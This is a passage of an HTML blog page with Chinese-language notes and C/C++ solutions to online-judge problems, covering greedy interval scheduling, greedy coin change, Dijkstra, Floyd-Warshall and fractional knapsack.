n1;i1++)</div><div class="line">        <span class="keyword">for</span>(j2 = <span class="number">0</span>;j2 &lt; m2;j2++)</div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n2;j++)</div><div class="line">              matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2];</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2 - <span class="number">1</span>;j++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,matrix3[i][j]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,matrix3[i][m2<span class="number">-1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1061"><a href="#1061" class="headerlink" title="1061"></a>1061</h2><h3 id="想法-2"><a href="#想法-2" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。其实就是任务选择问题。</p>
<ul>
<li>按照约会完成时间从早到晚排序</li>
<li>选择具有最早完成时间的girl</li>
<li>将此girl加入到约会列表中</li>
<li>对子问题重复上述问题</li>
<li>强烈谴责Ckp</li>
</ul>
<h3 id="提交-12"><a href="#提交-12" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> info&#123;</div><div class="line">    <span class="keyword">char</span>  name[<span class="number">16</span>];</div><div class="line">    <span class="keyword">char</span>  starttime[<span class="number">6</span>];</div><div class="line">    <span class="keyword">char</span>  endtime[<span class="number">6</span>];</div><div class="line">&#125;info;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info * s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">static</span> info mm[<span class="number">1005</span>] ;</div><div class="line">    <span class="keyword">static</span> info mmcopy[<span class="number">1005</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s%s"</span>,mm[i].name,mm[i].starttime,mm[i].endtime);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(mm,<span class="number">1</span>,n,n);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].endtime,mm[<span class="number">1</span>].endtime);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].name,mm[<span class="number">1</span>].name);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].starttime,mm[<span class="number">1</span>].starttime);</div><div class="line">    <span class="keyword">int</span> cal = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(mmcopy[cal].endtime,mm[i].starttime) &lt;= <span class="number">0</span>)&#123;</div><div class="line">            cal++;</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].endtime,mm[i].endtime);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].name,mm[i].name);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].starttime,mm[i].starttime);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cal);</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; cal; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,mmcopy[i].name);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,mmcopy[i].name);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info* s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)&#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        info x;</div><div class="line">        <span class="built_in">strcpy</span>(x.endtime,s[l].endtime);</div><div class="line">        <span class="built_in">strcpy</span>(x.name,s[l].name);</div><div class="line">        <span class="built_in">strcpy</span>(x.starttime,s[l].starttime);</div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[j].endtime,x.endtime) &gt;= <span class="number">0</span>)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                <span class="built_in">strcpy</span>(s[i].endtime,s[j].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].starttime,s[j].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].name , s[j].name);</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[i].endtime,x.endtime) &lt; <span class="number">0</span>)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line"></div><div class="line">                <span class="built_in">strcpy</span>(s[j].endtime,s[i].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].starttime,s[i].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].name,s[i].name);</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(s[i].endtime,x.endtime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].starttime,x.starttime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].name,x.name);</div><div class="line"></div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>,n);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r,n);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1062"><a href="#1062" class="headerlink" title="1062"></a>1062</h2><h3 id="想法-3"><a href="#想法-3" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。尽量选择面值大的。<br>将元转换为角，这样都是整数，进行处理更方便。</p>
<h3 id="提交-13"><a href="#提交-13" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> zhibi&#123;</div><div class="line">    <span class="keyword">int</span> number;</div><div class="line">    <span class="keyword">int</span> value;</div><div class="line">&#125;zhibi;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    zhibi arr[<span class="number">7</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i].number);</div><div class="line">    &#125;</div><div class="line">    arr[<span class="number">1</span>].value = <span class="number">500</span>;</div><div class="line">    arr[<span class="number">2</span>].value = <span class="number">100</span>;</div><div class="line">    arr[<span class="number">3</span>].value = <span class="number">50</span>;</div><div class="line">    arr[<span class="number">4</span>].value = <span class="number">10</span>;</div><div class="line">    arr[<span class="number">5</span>].value = <span class="number">5</span>;</div><div class="line">    arr[<span class="number">6</span>].value = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> remainMoney;</div><div class="line">    remainMoney = <span class="number">1000</span> - n * <span class="number">25</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">int</span> j = remainMoney / arr[i].value;</div><div class="line">            <span class="keyword">int</span> number = j&gt;arr[i].number?arr[i].number:j;</div><div class="line">            remainMoney = remainMoney - number*arr[i].value;</div><div class="line">            stat = stat + number;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,stat);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1075"><a href="#1075" class="headerlink" title="1075"></a>1075</h2><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>直接dijkstra。 采用邻接矩阵存储。</p>
<h3 id="提交-14"><a href="#提交-14" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1078"><a href="#1078" class="headerlink" title="1078"></a>1078</h2><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><p>任意两点间的最短路径问题的变体吧。一旦找出了从某个源点（人）到其他所有人需要的层数时，记录下来，如果有的人与其他所有人都不认识，则该层数是 无穷大（INF）。之后通过循环，找出从每个源点出发所需要的层数，并取最大值。要注意的是 算法求得最短路径 是 经过了几条路径（路径权为 1 ，路径权和即有几条路径），而题目的 层数M 是指 两个人之间还有多少人，即经过了多少个 点， 所以在最后的结果中记得减一。</p>
<h3 id="提交-15"><a href="#提交-15" class="headerlink" title="提交"></a>提交</h3><h4 id="dijkstra算法"><a href="#dijkstra算法" class="headerlink" title="dijkstra算法"></a>dijkstra算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdbool.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 100</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> cost[MAXN+<span class="number">2</span>][MAXN+<span class="number">2</span>]; <span class="comment">//  保存 图 （各权值）</span></div><div class="line"><span class="keyword">int</span> n; <span class="comment">// 顶点数</span></div><div class="line"><span class="keyword">int</span> d[MAXN]; <span class="comment">// 从初始点出发 的最短距离</span></div><div class="line"><span class="keyword">bool</span> used[MAXN]; <span class="comment">// 已经使用过的图</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;cost[i][j]);</div><div class="line"></div><div class="line">    dijkstra(<span class="number">1</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> s)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        d[i] = INF;</div><div class="line">    <span class="built_in">memset</span>(used, <span class="literal">false</span>, <span class="keyword">sizeof</span>(<span class="keyword">bool</span>) * (n+<span class="number">1</span>));</div><div class="line">    d[s] = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</div><div class="line">        <span class="keyword">int</span> v = <span class="number">-1</span>;</div><div class="line">        <span class="keyword">int</span> u;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            <span class="keyword">if</span> ( !used[u] &amp;&amp; ( v == <span class="number">-1</span> || d[u] &lt; d[v]))</div><div class="line">                v = u;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (v == <span class="number">-1</span>)</div><div class="line">            <span class="keyword">break</span>;</div><div class="line"></div><div class="line">        used[v] = <span class="literal">true</span>;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (u = <span class="number">1</span>; u &lt;= n; u++)</div><div class="line">            d[u] = min( d[u], d[v] + cost[v][u]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,d[n]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a&gt;b?b:a;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="Floyd-Warshall-算法"><a href="#Floyd-Warshall-算法" class="headerlink" title="Floyd-Warshall 算法"></a>Floyd-Warshall 算法</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 102</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0xfffff</span></div><div class="line"><span class="keyword">int</span> G[MAX][MAX];</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    <span class="keyword">int</span> M = <span class="number">0</span>;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)&#123;</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;G[i][j]);</div><div class="line">            <span class="keyword">if</span> ( G[i][j] == <span class="number">0</span>)</div><div class="line">                G[i][j] = INF;</div><div class="line">            <span class="keyword">if</span>  ( i == j )</div><div class="line">                G[i][j] = <span class="number">0</span>;</div><div class="line">        &#125;</div><div class="line"></div><div class="line"></div><div class="line">    warshall_floyd();</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">        <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">            M = max(M, G[i][j]);</div><div class="line">    <span class="keyword">if</span> ( M  == INF)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,<span class="number">-1</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, M<span class="number">-1</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">warshall_floyd</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> k, i, j;</div><div class="line">    <span class="keyword">for</span> (k = <span class="number">1</span>; k &lt;= n; k++)</div><div class="line">        <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">            <span class="keyword">for</span> (j = <span class="number">1</span>; j &lt;= n; j++)</div><div class="line">                G[i][j] = min(G[i][j], G[i][k] + G[k][j]);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">min</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? b : a;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</div><div class="line">    <span class="keyword">return</span> a &gt; b ? a : b;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1316"><a href="#1316" class="headerlink" title="1316"></a>1316</h2><h3 id="想法-4"><a href="#想法-4" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。有别于0/1背包问题。<br>每次选取尽量多的单位价值高的物体。</p>
<h3 id="提交-16"><a href="#提交-16" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div 